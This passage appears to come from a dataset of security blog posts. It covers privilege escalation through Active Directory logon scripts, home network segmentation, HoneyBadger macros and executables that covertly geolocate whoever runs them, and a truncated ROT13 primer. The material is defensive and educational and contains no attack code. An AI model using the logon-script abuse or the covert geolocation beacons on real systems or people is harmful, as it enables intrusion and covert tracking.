appropriately restricted.\n\nGroup Policy Modification\n\nIn this case, the attacker finds that their user account has permission to modify Group Policy Objects within the Group Policy hierarchy. \n\nWith the ability to modify policy, the attacker has a number of options available to them. One of those options is to deploy their own logon script policy. In a recent engagement, this yielded administrative access on all computers where the policy was applied.\n\nBloodHound is an excellent way to identify attack paths in this manner. When write access is identified on a GPO (GenericWrite or GenericAll) as a standard domain user, the organization should audit to ensure that permissions are properly restricted.\n\nFurthermore, the organization should periodically audit permissions on all Group Policy Objects to ensure that permissions are correct.\n\nUser Object Attribute Modification\n\nA similar condition arises when the attacker has control of a user with the ability to modify attributes of objects within the Active Directory schema. In the context of this post, the object type would be users. This vector is similar to the previous one. However, instead of modifying a Group Policy Object, the attacker simply modifies the ScriptPath attribute on the writable user account. \n\nThe default location of logon scripts is the \\\\\\SYSVOL\\Scripts folder. However, this attribute will also happily accept any valid UNC path. As a result, the attacker can update the attribute to point to a writable share where a malicious script can be planted.\n\nThis is another area BloodHound can help identify issues that might allow privilege escalation within the environment. A path exhibiting this condition would show GenericWrite or GenericAll between a user or group node and another user.\n\nTo catalog and audit all Active Directory delegated permissions within your environment, you can use the PowerShell script below published by Netwrix.\n\nhttps://raw.githubusercontent.com/thephoton/activedirectory-delegation-searcher/master/search.ps1\n\nConclusion\n\nThe ability to automatically execute scripts or commands during session initialization is a very powerful feature that decreases administrative burden on IT staff. However, an attacker who stumbles on an opportunity to abuse one of the techniques described above may have a significant opportunity to escalate privilege, move laterally, and persist within the environment. Knowing this, organizations need to pay very close attention to configuration changes within the environment and ensure that in-place protections are catching common abuses.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Home Network Design - Part 2\"\nTaxonomies: \"Author, Ethan Robish, How-To, Informational, InfoSec 101, ethan robish, home network\"\nCreation Date: \"Wed, 15 Apr 2020 12:04:00 +0000\"\nEthan Robish //\n\nWhy Segment Your Network?\n\nHere's a quick recap from Part 1. A typical home network is flat. This means that all devices are connected to the same router and are on the same subnet. Each device can communicate with every other with no restrictions at the network level.\n\nThis network's first line of defense is a consumer router[1][2]. It also has your smart doorbell[3], door lock[4][5][6], lightbulb[7], and all your other IoT devices[8][9]. Not to mention all your PCs, tablets, and smartphones, which you, of course, keep patched with the latest security updates[10] right? Windows 7 is now unsupported and most mobile devices only receive 2-3 years of OS and security updates at the most. What about devices brought over by guests? Do you make sure those are all up to date as well?\n\nOnce an attacker has a foothold on your network, how hard would it be for them to spread to your other devices? Many router vulnerabilities are available for an attacker to exploit from inside the router's firewall. Your router is the gateway for all your other devices' internet traffic, opening you up to rogue DNS, rogue routes, or even TLS stripping man-in-the-middle attacks. Some of the most devastating ransomware attacks[11] have spread by exploiting vulnerabilities in services like SMB or through password authentication to accessible systems on the same network segment. Speaking of passwords, yours are all at least 15 characters (preferably random) right[12]? Ransomware is also known to try default or common passwords and even attempt brute forcing[13]. You might as well make sure that you have multi-factor authentication enabled where you can because malware can also steal passwords from your browser and email[14]. \n\n[1]: https://threatpost.com/threatlist-83-of-routers-contain-vulnerable-code/137966/\n\n[2]: https://routersecurity.org/bugs.php\n\n[3]: https://threatpost.com/ring-plagued-security-issues-hacks/151263/\n\n[4]: https://www.cnet.com/news/smart-lock-has-a-security-vulnerability-that-leaves-homes-open-for-attacks/\n\n[5]: https://techcrunch.com/2019/07/02/smart-home-hub-flaws-unlock-doors/\n\n[6]: https://threatpost.com/smart-lock-turns-out-to-be-not-so-smart-or-secure/146091/\n\n[7]: https://www.theverge.com/2020/2/5/21123491/philips-hue-bulb-hack-hub-firmware-patch-update\n\n[8]: https://threatpost.com/half-iot-devices-vulnerable-severe-attacks/153609/\n\n[9]: https://threatpost.com/?s=iot\n\n[10]: https://www.it.ucla.edu/security/resources/security-best-practices/top-10-it-security-recommendations\n\n[11]: https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/\n\n[12]: https://www.blackhillsinfosec.com/?s=password\n\n[13]: https://www.zdnet.com/article/ransomware-attacks-weak-passwords-are-now-your-biggest-risk/\n\n[14]: https://www.zdnet.com/article/ftcode-ransomware-is-now-armed-with-browser-email-password-stealing-features/\n\nSegmentation means separating your devices so that they cannot freely communicate with each other. This may be completely isolating them or only allowing certain traffic but blocking everything else.\n\nHow does segmentation help combat the issues outlined above? The first thing to realize is that no one is perfect. Even if you are security conscious and actively work to fix issues, there are always going to be security vulnerabilities and weaknesses. \n\nYou may be running IoT devices that you have no control over whether the manufacturer patches security issues. \n\nYou may own mobile devices that no longer receive updates. \n\nYou may have devices with default passwords set simply because you didn't realize there was a default account added.\n\nOnce we realize that we can't be perfect, the idea of having different layers of security and practicing defense in depth starts making sense.\n\nhttps://en.wikipedia.org/wiki/Defense_in_depth_(computing)\n\nYou likely already have some layers implemented.\n\nYour edge firewall on your home router keeps random inbound traffic out.\n\nYour personal devices may have software firewalls activated.\n\nYour devices may have authentication enforced to prevent anonymous usage.\n\nYou could have anti-virus software that keeps common and known malware from infecting your system.\n\nEach of these layers is fallible, but adding more layers makes it harder and harder for an attacker to craft an exploit path that bypasses all of them. They can also limit the damage should one layer be compromised. For instance, say an attacker somehow broke through your edge firewall. Your security layers could prevent or delay further compromise into other devices. Network segmentation is an excellent layer to add to your defense in depth strategy.\n\nApproaches To Network Segmentation\n\nYou can think of segmentation on a linear scale. \n\nOn one end of the scale, every device is on the same network. This is the same as no segmentation, but everything is interoperable (including malware). You don't need instructions on setting this up because it is the default in every networking device on the planet. This is like a bowl of candy where every piece can freely move around and touch all the others.\n\nOn the other end of the scale, every device is completely isolated from each other. This is similar to giving every device a public IP address and making it available on the internet. This isn't as crazy as it sounds as IPv6 makes this completely possible and it forces you to treat everything as untrusted. Everything has firewall rules only allowing certain services to be accessed. The services that are accessible enforce authentication and encryption (likely SSO and TLS). This is similar to a box of chocolate where every piece is isolated from the others.\n\nNotably Google has implemented this in what they call BeyondCorp.\n\nhttps://cloud.google.com/beyondcorp\n\nhttps://security.googleblog.com/2019/06/how-google-adopted-beyondcorp.html\n\nhttps://thenewstack.io/beyondcorp-google-ditched-virtual-private-networking-internal-applications/\n\nGoogle's BeyondCorp has research papers for guidance and solutions to craft your own implementation, provided you use Google's cloud for everything.\n\nCloudflare created a product that operates on a similar idea but can be used anywhere, rather than requiring you to migrate everything into a cloud environment. This is a paid product, but the free tier may well work for home networks.\n\nhttps://blog.cloudflare.com/introducing-cloudflare-access/\n\nhttps://blog.cloudflare.com/cloudflare-access-now-teams-of-any-size-can-turn-off-their-vpn/\n\nhttps://teams.cloudflare.com/access/index.html\n\nAs I mentioned, network segmentation is a scale. This post will fall somewhere in the middle between these extremes. Keeping with the candy analogies, our goal is to group similar pieces together into separate containers.\n\nThe challenge is to determine the best balance between simplicity, interoperability, and security for you.\n\nNetwork Segmentation Concepts\n\nIn order to get segmentation, you need your packets to traverse a device that can apply some sort of filtering. Much of my confusion when setting up my own network stemmed from the fact that this happens at different layers of the OSI model, with different concepts overlapping or working together. If these concepts are new to you, see the \"Terminology\" section of my previous posts: \n\nhttps://www.blackhillsinfosec.com/home-network-design-part-1\n\nSwitch - A managed switch can implement separate LAN segments through software configuration. These are called virtual LANs or VLANs. Managed switches can have rules that limit traffic between different ethernet ports. These are called port Access Control Lists (ACLs). Layer 3 switches also have VLAN ACLs that filter traffic between VLANs (VACLs). These are basically limited firewall rules implemented in switches. They aren't as flexible as software firewalls and only apply to OSI layers 3 and below, but they have the benefit of better performance compared to a firewall.\n\nhttps://youtu.be/oo-hejIq3iQ?t=11\n\nRouter - Routers must have routes configured, either automatically through a route discovery protocol or statically set. Routes are used in order to allow IP traffic to pass between different network subnets. Conversely, if a route is not present then no traffic will flow between those subnets. You might be tempted to call this a security feature and use it as such, but I advise against that. Routers will often automatically create routes between networks and there are entire protocols devoted to learning and sharing routes between routers (e.g. OSPF, EIGRP, RIP). If you rely on the absence of a rule for security you might find your router has betrayed you by adding it for you and breaking your deliberate segmentation.\n\nFirewall - This is the most flexible of all the options and can operate on OSI layers 3 through 7. But in most networks, this means that packets will have to pass through both switch hardware and routing hardware before making it to a CPU which applies the firewall filtering. Switches have specialized hardware and process packets extremely quickly. Any time a packet can't be handled by a switch alone it will add extra resource load on the next device and add extra latency. Without the decisions made by switches, a firewall's CPU could easily become overloaded on a large network. Even a single physical device that functions as a switch, router, and firewall all wrapped up in one will most likely have specialized hardware inside for switching. As a wise uncle once said, \n\nThis doesn't even cover all the available options. In addition, there is wireless client isolation, virtual routing and forwarding (VRF), and along with others that I don't even know about. Finding the right combination of these concepts is a balance between your configuration needs, your available equipment, and your throughput requirements.\n\nWhat I have above should get you through this post but if you are interested, here are some further resources:\n\nhttps://geek-university.com/ccna/cisco-ccna-online-course/\n\nhttp://www.firewall.cx/networking-topics.html\n\nhttps://www.paloaltonetworks.com/cyberpedia/what-is-network-segmentation\n\nhttps://en.wikipedia.org/wiki/Network_segmentation\n\nhttp://www.linfo.org/network_segment.html\n\nhttps://www.cyber.gov.au/publications/implementing-network-segmentation-and-segregation\n\nDeciding What To Put In Each Segment\n\nDevices on the same network segment will be able to talk to each other freely with no (network) firewall restrictions, or potentially only the ACLs which your managed switch can enforce. Additionally, broadcast and multicast traffic will be available to all the devices on the segment. Whereas, devices on different segments can talk to each other using unicast traffic within the bounds of router routes and firewall rules.\n\nIf you are security-minded (a likely assumption since you're reading this blog) then you might be tempted to isolate each of your devices and open firewall rules one by one as needed. Or to create a multitude of segments with a few devices in each. This is a decent approach if you have the resources and time to dedicate to this. But I'll give you the benefit of my experience as to why I think simpler is better. As you get more complex, you increase the setup and maintenance burden. Not only does this take more time and energy, but you also run the risk of losing the security benefits you were after due to creating something more complex than what you currently understand. \n\nThere is a reason this post is written in 2020 while part one of this series was in 2017. After I wrote part one I grouped my 21 devices into 10 different types, created a spreadsheet, and assigned them into 8 segments. Even then I realized this was too many and ended up implementing 6 segments. I spent too much time trying to get devices to work together, pruning and merging certain segments over time in frustration. \n\nThe final straw was after I had visitors connected to my guest wireless network and noticed that the dynamic IP addresses they had gotten didn't look right. I investigated and discovered that somewhere along the way I had completely blown the separation I thought I had between my home devices and guest devices. At this point, I decided to tear everything down and start from scratch: to build something up that I could fully understand rather than trying to patch up a design that was overly complex to begin with.\n\nSegmentation Approaches\n\nI came up with two ways to approach network segmentation:\n\nTop-Down: Go from one segment to two (then three, etc) by thinking about all my devices and deciding which ones I cared most about and wanted to separate from everything else.  This could simply be wanting all your own devices separate from your guests' devices. Or it could be wanting your personal computers separate from your media and IoT devices.\n\nBottom-Up: Start with every device separate and think about how to group them together based on similar resource access requirements.\n\nYou will likely find a hybrid of the two approaches most useful. At the end of the top-down approach you can use the bottom-approach to continue splitting up your biggest groups and help develop firewall rules. And if you start with the bottom-up approach, you will still likely want to make some high-level group decisions like splitting off your work and guest segments.\n\nThe primary reason we are implementing network segmentation is for security. It is easy to get lost in the weeds so one piece of advice is to keep the end goal of compartmentalizing services and data in mind.\n\nTop-Down Approach\n\nStart with all of your devices in one group and identify groups to break out based on your needs. It is called top-down because you are going from general (one group) to specific (multiple groups). This is the approach I took most recently and ended up with a network that was simpler to configure and simpler to manage. I recommend taking this approach to start with.\n\nList out all client devices.\n\nDecide which devices you'll need to segment at a minimum. For instance, work devices and guest devices must be on their own segments.\n\nGroup your devices under each category.\n\nWork\n\nGuest\n\nHome\n\nYou can start with these segments, or you can divide them up further if you can easily identify additional groups of devices. For instance, you might decide that you have several Home devices that only need internet access and nothing else. You could choose to connect these to your Guest segment, or you could create a separate segment called Internet Only.\n\nThis approach is meant for simplicity and if you start getting too granular you will benefit from reading through the considerations needed for the bottom-up approach.\n\nExample\n\nLet's walk through a real-world example where the primary goals are to separate work devices from home devices and provide a guest network.\n\nYou can do this a number of ways. I'll use a spreadsheet, but you can use pen and paper, lists in a document, or a kanban (e.g. Trello) board.\n\nList out all client devices in the first column.\n\nIn the first row create a new column for each of your must-have segments (e.g. Work, Guest).\n\nMark your devices in each segment.\n\nDeviceHomeWorkGuestNASxDesktopxThinkPadxMacBook 13\"xMacBook 15\"xSurfacexiPhone 8xPixel 3xGalaxy S4xiPhone SExKindle FirexXbox OnexShield TVxBrother PrinterxHD HomeRunx\n\nIn this case, I'm reserving the Guest group for anyone who visits my house and brings a phone or laptop of their own. If I get any additional work devices in the future, those will also go in the Workgroup.\n\nI could take this further if I wanted to. Let's say that some of my devices don't need access to anything local and that they only ever talk to the internet. I've also decided to put my home server into its own group.\n\nDeviceHomeWorkServerInternet OnlyGuestNASxDesktopxThinkPadxMacBook 13\"xMacBook 15\"xSurfacexiPhone 8xPixel 3xGalaxy S4xiPhone SExKindle FirexXbox OnexAndroid TVxBrother PrinterxHD HomeRunx\n\nRemember that we have several tools at our disposal to limit traffic:\n\nVLANs\n\nPort ACLs\n\nWireless Isolation\n\nFirewall Rules\n\nIf I keep this in mind, I can start seeing that I'll need to put in firewall rules to allow each group access to certain services on my home server. While I could consider connecting my Internet Only devices to my Guest network and implement wireless client isolation, I would prefer to keep them separate. Sharing the network password with other devices introduces a risk of eavesdropping. Furthermore, Windows 10 has been known to share wireless credentials with the user's contact list, meaning your guest wireless network key could make it into the hands of your friends' friends, who you do not know.\n\nBottom-Up Approach\n\nStart with each of your devices in its own group. You will have as many groups as you have devices. Then start grouping devices together based on specific needs until you can no longer justify merging groups together. I took the bottom-up approach during my first attempt at segmenting my network. My advice if you decide to take this approach is:\n\nBe honest about the skills you have and the amount of time and frustration you are willing to put up with in order to learn what you don't know.\n\nKeep grouping an extra step and decide which device groups you would merge together next. This can save you some trouble if you run into unexpected issues. You may even decide that you like the groups you end up with here better and use them.\n\nMy steps for the bottom-up approach are:\n\nList out all client devices.\n\nMark devices which will run a server that needs to be accessed by other devices.\n\nMark devices for which local auto-discovery is necessary to function. If you have the option of inputting the IP address manually in your application and are willing to do that, there's no need to have the auto-discovery features.\n\nFor each device, you identified as a server, go through all your other devices and determine which ones will need access.\n\nFor each device you identified with auto-discovery, go through all your other devices and determine which ones need to auto-discover it.\n\nA Quick Note About Service Discovery And Multicast DNS\n\nPrinters, Chromecasts, and home automation devices often use multicast traffic to perform service auto-discovery, specifically, multicast DNS (mDNS), though other multicast-based protocols are sometimes used. Multicast traffic does not cross network segments (technically broadcast domains) without extra configuration (IGMP) and the multicast used by mDNS requires a repeater service in order to cross network segments.\n\nFor example, I have a network TV tuner that requires an app to connect and watch TV. The app will automatically detect the tuner with no way to manually enter its IP address. It relies on multicast traffic which means I have to keep it on the same network as all the devices I expect to use it with.  Other examples of devices you might run into are screen mirroring (e.g. Chromecast), speakers (e.g. Sonos), file shares (e.g. Apple Time Capsule), and printing. \n\nSome devices may appear to use auto-discovery but in reality, use a cloud service to facilitate discovery and management. If you're not sure if your device relies on local auto-discovery, disconnect your home's internet connection and try to locate the device in your client application (you may have to remove it first if it was already saved). If it finds it and can connect there's a good chance it is using some form of auto-discovery. You can also fire up Wireshark and look for mDNS packets (filter: mdns) or use a tool that speaks mDNS to query for services on your network.\n\nIn this post, I am choosing the simpler route that requires multicast devices to be on the same network segment, but at the end are some options if you'd like to research a different solution for your specific network setup. \n\nExample\n\nYou can skip this approach if you're happy with the top-down exercise. But the bottom-up approach can help you create further segmentation and gain a more intimate knowledge of your network devices and services and how they interact, which will help you when it comes time to create firewall rules.\n\nAgain, I'll use a spreadsheet but you can do this with pen and paper, lists in a document, or a kanban (e.g. Trello) board.\n\nList out all client devices in the first column. Also, create an empty Server column and an empty Auto-Discovery column.\n\nMark all your devices in the Server column which are hosting services that your other devices will need to access.\n\nFor all your servers, mark in the Auto-discovery column where auto-discovery functionality is required.\n\nDeviceServerAuto-discoveryNASxDesktopThinkPadMacBook 13\"MacBook 15\"SurfaceiPhone 8Pixel 3Galaxy S4iPhone SEKindle FireXbox OneShield TVxxBrother PrinterxHD HomeRunxx\n\nIn this case, I have 4 devices which are classified as servers on my home network. Of these, only 2 have auto-discovery as a mandatory feature. Auto-discovery would be nice for adding printers, but considering I can manually add the location of a printer and once it's set up I don't have to worry about it again I'm fine neutering the auto-discovery feature.\n\nNext, we're going to expand our table. For every server you marked, make a new column for each service that needs to run. Pay attention here as you might have multiple services hosted on the same system. For instance, my NAS hosts a media server, a fileshare, and a DNS server from the same server so I will make a new column for each of these services. For any services which require auto-discovery, mark the column with (auto).\n\nHere's what the table looks like now.\n\nDeviceServerAuto-DiscoveryMediaFileshareDNSPrintingTV Tuner (auto)Casting (auto)NASxDesktopThinkPadMacBook 13\"MacBook 15\"SurfaceiPhone 8Pixel 3Galaxy S4iPhone SEKindle FireXbox OneShield TVxxBrother PrinterxHD HomeRunxx\n\nNext, go through each service and mark which devices will require access to that service. I used dashes to indicate the server hosting the service.\n\nDeviceMediaFileshareDNSPrintingTV Tuner (auto)Casting (auto)NAS---DesktopxxThinkPadxxMacBook 13\"xxxxxMacBook 15\"xxxxxxSurfacexxxxxiPhone 8xxxxPixel 3xxxGalaxy S4xxiPhone SExxKindle FirexxxXbox OnexxxShield TVxxx-Brother Printerxx-HD HomeRunx-\n\nWe won't necessarily use all these columns to determine what groups to put systems in. But they will come in handy when creating firewall rules later. The columns we do care about are the auto-discovery services since those will need to be on the same segment to function correctly. Unless you use an mDNS repeater (described earlier in this article) then any rows with marks in multiple auto-discovery columns means those services will have to be on the same segment.\n\nHere's what I mean from the table above:\n\nEven though there are several devices that only need access to one of the services and not the other, the orange highlighted devices (MacBook 15\", Surface, iPhone 8) need access to both services requiring auto-discovery. This means that the TV Tuner and Casting services (served by the Shield TV and HD HomeRun) will need to be on the same network segment along with those client devices. And that means that any other device that needs access to only one of those services will be on that segment as well. In the event that you have some auto-discovery services that do not have overlapping clients, congratulations! You can put these each in their own network segments and keep their respective clients isolated from each other.\n\nAt this point we have one network segment for sure that contains all the aforementioned auto-discovery related devices. Since every other service required is unicast we could technically put each of the remaining devices in their own isolated segment and simply manage routes and firewall rules between each of them. This would offer the greatest security in theory. But in practice, this is likely too complex and time-consuming to be worth it. This is why I advised to keep going an extra step and see which devices make sense to group together next.\n\nIn the table below, you can see how I've rearranged and grouped devices based on similarities in services they require access to. This would simplify firewall configuration as instead of having to require rules for individual devices, I could instead configure firewall rules for an entire segment and any devices in that segment which require access to a certain service goes in that segment. For example, below I could have a \"Fileshare\" segment and a separate \"Media\" segment and configure the firewall rules accordingly.\n\nWhile this is a good exercise to inform firewall rules, it would be a mistake to stop here. Looking at my groups I can see that I still need to have my ThinkPad work machine isolated which means it can't go on the same segment as the Desktop and Printer. Furthermore, I think I'd like to have the printer isolated in its own segment. Printers aren't known for having the best security and by putting in a segment by itself I could implement firewall rules that let all other segments reach into the print spooling port but prevent the printer from reaching out to any of my other devices (save for the DNS and Fileshare services it needs). On the other hand, I'm just fine with putting the Galaxy S4 and iPhone SE together in the same segment and creating separate segments for each of them would be overkill.\n\nAccessing Services Across Segments\n\nThere are a number of reasons you may want to allow devices to communicate across segments. One scenario is having a separate guest network but you still want to give them access to specific services on a different segment.\n\nFirst, a warning: you don't know if the devices your guests bring over are already infected with malware or what they will do once connected to your network. Letting them connect to any of your own devices is a risk. That said, here are some options for dealing with these issues.\n\nJust say no. Apologize and tell your guests that printing, casting, etc doesn't work from your guest network.\n\nAdd firewall rules that allow the service you want to make available.\n\nThis works well for unicast traffic but not for multicast traffic. It does mean you will have to manually configure the client to connect by giving it an IP address.\n\nYou can have your printer, file share, DNS server, etc on a separate segment from your guest network, but you can add an \"allow\" firewall rule from the guest network to the IP and port of the service you want available. I do this for my local Pi-Hole DNS server since I want my guests to also have the ad-blocking capability. \n\nYou should set up authentication on the services so that guests can only access resources you allow them to. For example, if you make a file server available for your guests you don't want them to have read and write access to all your private documents or backups. Privacy concerns aside, that's a recipe for disaster if a cryptolocker happens to hitch a ride onto your network on your guest's device.\n\nSet up Guest mode on the Chromecast. This is a feature specific to Chromecasts, though you can check your own device's documentation to see if it has a similar feature.\n\nhttps://support.google.com/chromecast/answer/6109286?hl=en\n\nUse Google Cloud Print. If your printer supports it, you can tie a printer to your Google account and share access with users without being on the same network.\n\nhttps://www.google.com/cloudprint/learn/\n\nhttps://support.google.com/cloudprint/answer/2541899\n\nConfigure multicast routing with IGMP. This does not help for mDNS but can help for other multicast protocols like Simple Service Discovery Protocol (SSDP).\n\nUse an mDNS repeater. Some networking equipment has this feature built-in. If yours doesn't, you have an option of setting up a Linux server that straddles VLANs and runs an mDNS repeater daemon. If you are purchasing new hardware, be sure your specific model supports this feature.\n\nUbiquiti products call it \"mDNS repeater\" or \"Enable Multicast DNS\". This appears to enable multicast traffic forwarding across all VLANs however.\n\nCisco products call it \"service discovery gateway\".\n\nMikrotik, unfortunately, doesn't have this feature though it is commonly requested.\n\nmdns-repeater is a daemon you can compile and run on Linux. If you want the most lightweight option or want to get it running on your embedded Linux based router (e.g. DD-WRT) then this is an option. http://irq5.io/2011/01/02/mdns-repeater-mdns-across-subnets/\n\nAvahi is a package included in many repositories and includes functionality called a \"reflector\" that you can enable in your configuration file.\n\nhttps://apple.stackexchange.com/a/132305 \n\nhttp://chrisreinking.com/need-bonjour-across-vlans-set-up-an-avahi-gateway/\n\nGathering Hardware\n\nOnce you have a plan for which devices to segment from each other, you'll need to start thinking about implementation. You'll need to create an inventory of networking gear you already have and what capabilities it has.\n\nAt the minimum you'll need:\n\nFirewall and Router (or layer 3 switch). These are most likely going to come in the same device.\n\nManaged switch with VLAN capability. This may also come in the same device as the firewall/router, but you may need to get additional ones to add more ports.\n\nEnough managed ethernet ports for the number of wired VLANs you want\n\nEnough ethernet ports (can be on unmanaged switches) for the number of wired devices you have\n\nWireless Access point capable of creating virtual Access Points with VLAN tags OR enough physical wireless access points for the number of wireless VLANs you want\n\nI gave some recommendations on hardware in Part 1 of this series.\n\nFurther Resources\n\nI'm planning at least one more post in this series where I will cover how I implemented the segmentation with my own hardware. I have Mikrotik devices so my configuration will be specific to them, though the concepts should be broadly applicable.\n\nIf you're anxious to get going on your own, here are some resources to get you on the right path.\n\nhttps://www.blackhillsinfosec.com/home-network-design-part-1/\n\nMikrotik\n\nhttps://www.youtube.com/channel/UC_vCR9AyLDxOlexICys6z4w\n\nhttps://forum.mikrotik.com/viewtopic.php?t=143620&sid=b2437441604735dc40d731a73e11d8a0#p706998\n\nUbiquiti\n\nhttps://www.youtube.com/playlist?list=PL-51DG-VULPqDleeq-Su98Y7IYKJ5iLbA\n\nhttps://www.youtube.com/channel/UCVS6ejD9NLZvjsvhcbiDzjw\n\nhttps://www.troyhunt.com/ubiquiti-all-the-things-how-i-finally-fixed-my-dodgy-wifi/\n\nhttps://www.troyhunt.com/friends-dont-let-friends-use-dodgy-wifi-introducing-ubiquitis-dream-machine-and-flexhd/\n\nhttps://scotthelme.co.uk/securing-your-home-network-for-wfh/\n\nPfsense\n\nhttps://www.youtube.com/user/TheTecknowledge/search?query=pfsense\n\nhttps://securityweekly.com/shows/security-weekly-471-tech-segment-building-a-pfsense-firewall-part-1-the-hardware/\n\nhttps://www.youtube.com/watch?v=b2w1Ywt081o\n\nCommunity\n\nhttps://www.reddit.com/r/homelab/\n\nhttps://discord.gg/aHHh3u5 \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Getting Started With Tracking Hackers With HoneyBadger\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, John Strand, Red Team, Red Team Tools, HoneyBadger\"\nCreation Date: \"Mon, 20 Apr 2020 12:07:00 +0000\"\n\nhttps://youtu.be/wsHDC1LD8_w\n\nHello and welcome. My name is John Strand, and in this video, we're going to talk a little bit about HoneyBadger. Now, in a number of other videos and a number of other things whenever you're talking about attribution or cyber deception, you can focus on creating documents or elements that'll beacon back and many times you can collect the IP address that's making the beacon. That's okay, but IP address geolocation isn't all that hot, but we can do better, and we have a specific tool that was created by our very own Bradley at Black Hills Information Security building on the work of Tim Tomes, or lanmaster53. Hopefully, these two will be merged in the very near future called HoneyBadger.\n\nNow, if we jump right in, HoneyBadger is on the ADHD installation and, once again, if you want ADHD, you can go to activecountermeasures.com. You can go to our free tools, check out our projects and you'll see ADHD there. This is, of course, the distribution that I use for Wild West Hackin' Fest classes and also at Black Hat, so check it out. All of the instructions once you get ADHD set up are on the desktop in a file called ADHD Usage. Once you have opened up that document, you would select Attribution, and then you would select HoneyBadger.\n\nNow, once you're in the HoneyBadger instructions, it goes into a lot of detail about how to set up HoneyBadger, how to configure HoneyBadger. One of the big gotchas is you do need a Google API Key in order to make the map function work in HoneyBadger. Let's talk a little bit about what this actually does. Well, what it's doing is a wireless site survey. Here I have a USB wireless adapter that I got off the Hak5 shop. Great stuff over there. With this USB wireless adapter, I can do a survey of all of the wireless networks. Now, you don't need a USB wireless adapter for HoneyBadger to work. That's not quite what I'm saying, but your computer system has the ability to see all of the wireless networks around it.\n\nThis is something you see every time you open up your phone looking for a wireless hotspot or your computer. That's because these access points are beaconing out about 10 times per second, announcing their BSSID and their ESSID. The BSSID is the MAC address, the media access control address for the access point. The ESSID is the actual access point name. What HoneyBadger does is causes the attacker's computer system to do a wireless site survey, give us those SSIDs, BSSIDs, and ESSIDs, and then it queries Google's API for geolocation and Google responds back.\n\nLet's actually take a look at the interface of HoneyBadger and some of the things that you would see there. First, whenever you're setting up HoneyBadger, you would set up targets. Now, the idea of a target is so that you can set up different campaigns that are identifiable from each other. I have demo, I have class, I have demo, I have Class, I have Spearfish, and they have different guids. This is important because if I set multiple different HoneyBadger elements, I want to be able to differentiate from them. I can put in an Excel spreadsheet, I can put it on a website, I can put it in a variety of different places and that distinction is important.\n\nAlso on this slide, you can generate a raw macro. Whenever I click the macro button, it actually takes me to the macro that you'd put into an Excel spreadsheet or, if you're really desperate, a Word document. I tend not to use this technology much in Word documents because everybody knows not to run any macros that show up in Word documents. What this does is a PowerShell command where it does a wireless site survey of all of the different wireless networks that are around. That's the macro.\n\nWe also have the capability of kicking out VB.NET code. With the VB.NET code, we can actually convert this to a standalone executable with something like vbc and Mono. This is all in the class and it's also in the instructions, but basically you would install Mono, start the Mono shell as an administrator. I can actually show you what that looks like here. I can basically go down to the start button and type \"Mono\". Then, when it says the Mono command prompt, I right-click and run it as administrator. Then, I would use vbc to actually convert that code, the macro.vb into an executable and actually convert it down to an executable. Then, when you run it, it'll do the geolocation.\n\nNow, that executable gives us tremendous flexibility to move it into a wide variety of different other formats. We can convert it and merge it with other executables like VPNs, things of that nature, and then we can get some really good geolocation on an attacker. Now, once I'm in ADHD, I want to show you what the maps look like and give you an idea of the accuracy.\n\nIf I click the map tab, these are all of the times that I've actually fired it off, and I'll go over here to Las Vegas, the last time I ran this class at Black Hat. I went too far, a land where I cannot return from. Let's see, I'm in Tuba City, so Grand Canyon National Park, Flagstaff, let's go back down into my little arrow. Here we go. Let's zoom into Las Vegas and on top of the Mandalay Bay and give you an idea of just how accurate this thing can be whenever you fire it up.\n\nNow, this is the executable. The macro, if you put it inside of an Excel spreadsheet, would be also really, really hyper-accurate, but it really depends on a number of things. If they actually are on a wireless network, you can pull that up. Here you can see that it's the Mandalay Bay, and if I switch it over to satellite, you're going to see right exactly where we were in the conference center the last time I actually fired this off. That's kind of cool.\n\nHoneyBadger is designed for extreme levels of attribution. This is using macros or VB code to actually do that. Now, with that in mind, also remember you're just getting the attacker's system to give the wireless networks that are around it. If I click on the log and I scroll all the way down to the bottom of the logs here, you can see what it looks like whenever you're actually querying that data. It actually pulls all of the wireless access points.\n\nHere you can see Black Hat and then the BSSIDs, and then it submits that data to Google. Now, when Google receives that data through the API that Google uses on your phone all of the time, Google will respond back with the latitude here, it'll respond back with the longitude here, and it'll also give you the overall accuracy in meters. Sometimes it's around a hundred meters, sometimes you get lucky and it's down to 20 meters. This is extreme levels of attribution.\n\nNow, is there a question as to the legalities of this? \n\nWell, if you look at what we're doing, the attacker would have to break into your environment, steal something, and then it would trigger. That's kind of dubious they'd actually press charges in that situation. \n\nFurther, we're using the same API that your phone is using hundreds of times per minute every single day. With that in mind, it becomes a little bit easier for us to use these technologies as defenders.\n\nI hope you enjoyed this video. Be sure to check out more videos. Be sure to check out the class at Wild West Hackin' Fest in San Diego and in Deadwood, and I hope to see you on Wednesdays with Enterprise Security Weekly with Paul, Matt, and myself. Take care and I'll see you in another video.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Getting Started With ROT Obfuscation\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, John Strand, Red Team, john strand\"\nCreation Date: \"Wed, 22 Apr 2020 16:38:18 +0000\"\n\nhttps://youtu.be/Xb52oX1wsn0\n\nHello, my name is John Strand. In this video, we're going to be talking about ROT or rotate. Why exactly are we talking about one specific thing? Well, this particular video is used with our Cyber Range that we're establishing at Black Hills Information Security and it's very common when you're pentesting or you're doing any type of cyber range activity or capture the flag to encounter a variety of different types of encoding and ROT is just one of them.\n\nSpecifically, we're going to talk about ROT 13. You can also see ROT 47 but we're going to be talking a little bit about ROT 13 to kick it off.\n\nNow, whenever you're looking at ROT, it means rotate. This is a variation of the Caesar Cipher where you could say R1 or rotate one, that means an A becomes a B, R2 would be an A becomes a C, and so on. So you're basically rotating the characters. Now the way that this used to work with the Caesar Cipher is you'd wrap it around a pole and the rotation would actually line up on the pole itself. But we can actually do that with computers.\n\nNow, why in the hell would anybody ever do this? Well, it actually became a very popular thing back in the '80s on various Usenet groups, basically bullet boards. And what was going on was you would have jokes or you would have text and you would want to obscure the punchline. So somebody would read the setup for the joke and then the punchline would be like ROT encoded. Then you could basically decode it, get the punchline. And that would be funny. \n\nIt was also kind of the equivalent of magazines, like MAD magazine would have a quiz and then you would turn it upside down and you would see it. So that was kind of the way that they actually utilized it. So originally, it was set up as just a joke. And that works, I guess. But okay, so things were different back then, whenever it came to humor. \n\nBut whenever we're looking at ROT and various variations of ROT, you're actually still 